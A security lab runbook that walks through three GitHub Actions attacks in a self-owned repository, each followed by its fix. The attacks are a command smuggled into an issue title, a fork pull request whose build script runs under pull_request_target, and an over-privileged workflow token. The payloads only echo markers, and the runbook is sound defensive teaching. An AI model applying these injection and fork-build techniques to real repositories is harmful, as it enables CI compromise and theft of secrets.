# Runbook: the real attacks on GitHub, with a second account

`make run` reproduces attacks 1 and 2 and their fixes on your Mac. This runbook is the same exercise on GitHub, where the
token default, the approval gate and OIDC exist. Do it only in repositories you own, with a second account you also own
and a throwaway AWS account with a budget alert. Nothing here was run while this repository was written: there was no
GitHub repository or AWS account, so the expected lines below come from GitHub's documented behavior; replace them with
what you see.

Names used: `OWNER` (your account), `OUTSIDER` (the second account), `vulnerable-demo` (the lab repository).

## 0. Make the lab repository

```bash
gh repo create OWNER/vulnerable-demo --private --clone && cd vulnerable-demo
cp -R ../attack-and-harden/exploit/vulnerable/.github ../attack-and-harden/exploit/vulnerable/package.json .
git add -A && git commit -m "lab: the three vulnerable workflows" && git push -u origin main
gh secret set DEPLOY_TOKEN --body demo-not-a-real-secret          # the lesson's fake secret, not a credential
gh api repos/OWNER/vulnerable-demo/actions/permissions/workflow --jq .default_workflow_permissions
```

Write down whether the last line prints `read` or `write` (attack 3 depends on it). Add `OUTSIDER` as nobody: it must stay
an outside account. Before you test anything, read the three files and write down what you think is wrong.

## 1. Attack 1 and fix 1: the issue title

```bash
# as OUTSIDER (gh auth switch --user OUTSIDER)
gh issue create --repo OWNER/vulnerable-demo --title 'Looks fine"; echo INJECTED-COMMAND-RAN; echo "' --body "test"
gh run list --repo OWNER/vulnerable-demo --workflow greet --limit 1      # as OWNER
gh run view <run-id> --repo OWNER/vulnerable-demo --log | grep -n -B1 -A1 INJECTED
```

Expected: a line that is only `INJECTED-COMMAND-RAN` (the log shows the expanded script, `echo "New issue: Looks fine";
echo INJECTED-COMMAND-RAN; echo ""`, which is why: the expression is replaced before the shell sees the text).

Fix: copy `.github/workflows/greet.yml` of this repository over the lab's, push, open the same issue again. Expected: one
line, `New issue: Looks fine"; echo INJECTED-COMMAND-RAN; echo "`.

## 2. Attack 2 and fix 2: the privileged fork build

```bash
# as OUTSIDER
gh repo fork OWNER/vulnerable-demo --clone && cd vulnerable-demo
# change only the build script, to something that proves where it ran and reads nothing secret:
node -e 'const f="package.json",p=JSON.parse(require("fs").readFileSync(f));p.scripts.build="echo FORK CODE RAN event=$GITHUB_EVENT_NAME repository=$GITHUB_REPOSITORY";require("fs").writeFileSync(f,JSON.stringify(p,null,2))'
git checkout -b speed-up && git commit -am "Speed up the build" && git push -u origin speed-up
gh pr create --repo OWNER/vulnerable-demo --title "Speed up the build" --body "please merge"
```

Read the run **in OWNER's repository** (that is where the privileged job executed):

```bash
gh run list --repo OWNER/vulnerable-demo --workflow pr-build --limit 1
gh run view <run-id> --repo OWNER/vulnerable-demo --log | grep "FORK CODE RAN"
```

Expected: `FORK CODE RAN event=pull_request_target repository=OWNER/vulnerable-demo`, on a pull request nobody reviewed.
Do not print, hash or measure the secret; the point is that the fork's code ran where it was in scope.

The safeguards you had to override: `actions/checkout` defaults to the **base** commit under `pull_request_target`; the
workflow sets `ref:` to the pull request's head to get the fork's files, and leaves `persist-credentials` at its default,
which writes the job's token into `.git/config` where the fork's script can read it.

Fix: replace the lab's `pr-build.yml` with this repository's, add `pr-report.yml` and `label.yml`, push. Open the pull
request again (push another commit to the fork). Expected: the build runs under `pull_request`, the run page says
"This workflow run was triggered by a pull request from a fork" and the token block shows `Contents: read`, and the
comment `The build of 1a2b3c4 passed.` appears from `pr-report`.

## 3. Attack 3 and fix 3: the token that can write

Open the log of any `label` run and expand "Set up job" > "GITHUB_TOKEN Permissions". With a read-and-write default it lists
`Contents: write`, `Pull requests: write` and more for a job that only prints "labeling". After the fix (`label.yml` of this
repository) it lists `Metadata: read` and the two scopes the job needs. Make the default read-only too:

```bash
DRY_RUN=1 scripts/github-settings.sh OWNER/vulnerable-demo OWNER      # read what it will do first
scripts/github-settings.sh OWNER/vulnerable-demo OWNER
```

## 4. Step 5: OIDC, the protected environment, and the refusal

```bash
terraform -chdir=infra/environments/demo init
terraform -chdir=infra/environments/demo apply -var-file=demo.tfvars        # after copying and editing demo.tfvars.example
scripts/set-variables.sh OWNER/vulnerable-demo
```

`scripts/github-settings.sh` (step 3 above) has created the `production` environment with you as required reviewer and
`main` as the only branch allowed to deploy, and deleted `DEPLOY_TOKEN`. Then:

1. **Approved deploy.** Run `gh workflow run deploy.yml --ref main`. The run waits with "Waiting for review"; approve it in
   the UI. Expected: `Assuming role with OIDC`, `aws sts get-caller-identity` (add it temporarily) shows
   `assumed-role/github-actions-deploy/GitHubActions`, and `aws s3 ls s3://BUCKET/releases/` lists the commit.
2. **Another branch.** `gh workflow run deploy.yml --ref some-branch`. Expected: the run fails before any step with "Branch
   'some-branch' is not allowed to deploy to production due to environment protection rules."
3. **Remove the protection, keep the trust.** On a branch, delete `environment: production` from the job and run it. The
   token's `sub` is now `repo:OWNER/vulnerable-demo:ref:refs/heads/some-branch`. Expected: `Not authorized to perform
   sts:AssumeRoleWithWebIdentity`; no credential was issued. This is the case `make check-trust` models offline.
4. **Fork.** The same workflow cannot be started from a fork: the fork's pull request token has no `id-token` scope, and its
   `sub` is `repo:OUTSIDER/vulnerable-demo:pull_request`.

Teardown: `terraform -chdir=infra/environments/demo destroy -var-file=demo.tfvars`, then delete the repository and the
fork. Cost while it exists: IAM and the identity provider are free; the bucket costs cents.

## 5. Write the checklist

[`review-checklist.md`](review-checklist.md) is the result; replace the lab line numbers with the run you actually saw if
you changed the files.
